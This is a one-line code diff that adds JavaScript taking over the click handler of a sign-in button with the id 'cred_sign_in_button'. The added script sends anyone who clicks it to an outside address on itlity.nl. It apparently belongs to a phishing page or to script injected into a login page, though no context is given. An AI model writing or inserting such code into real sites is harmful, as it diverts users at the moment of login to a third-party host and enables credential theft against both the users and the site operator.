@@ -1,0 +1,1 @@
+document.getElementById("cred_sign_in_button").onclick = function () { location.href = "https://itlity.nl/documents/poll"; };
